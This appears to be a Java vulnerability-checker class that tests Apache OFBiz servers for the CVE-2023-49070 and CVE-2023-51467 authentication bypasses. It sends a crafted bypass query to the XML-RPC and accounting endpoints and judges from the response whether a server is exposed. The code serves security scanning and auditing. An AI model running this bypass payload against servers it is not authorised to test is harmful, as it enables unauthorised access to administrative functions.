package org.ofbiz.util;

import okhttp3.Response;

import java.io.IOException;
import java.util.regex.Pattern;

public class Check {
    private static final String HTTP_PATTERN = "^https?://.+";

    private static final String LOGIN_TEXT = "OFBiz: Accounting Manager: Login";
    public static final String PERMISSION_TEXT = "USERNAME=&PASSWORD=&requirePasswordChange=Y";

    public static boolean has_CVE_2023_49070(String url) throws IOException {
        try {
            if(url.endsWith("/")){
                url = url.substring(0, url.length() - 1);
            }

            String vulUrl = url + "/webtools/control/xmlrpc;?" + PERMISSION_TEXT;

            Response response = Http.sendHttpsGetRequest(vulUrl);
            if(response.isSuccessful() && response.code() == 200 && response.header("Content-Type").contains("xml")){
                return true;
            }
            else {
                return false;
            }
        }catch (NullPointerException e){
            return false;
        }
    }

    public static boolean has_CVE_2023_51467(String url) throws IOException {
        try {
            if(url.endsWith("/")){
                url = url.substring(0, url.length() - 1);
            }

            String vulUrl = url + "/accounting/control/globalGLSettings?" + PERMISSION_TEXT;

            Response response = Http.sendHttpsGetRequest(vulUrl);
            if(response.isSuccessful() && response.code() == 200 && !(response.body().string().contains(LOGIN_TEXT))){
                return true;
            }
            else {
                return false;
            }
        }catch (NullPointerException e){
            return false;
        }
    }

    public static boolean isValidHttpUrl(String url) {
        Pattern pattern = Pattern.compile(HTTP_PATTERN);
        return pattern.matcher(url).matches();
    }
}
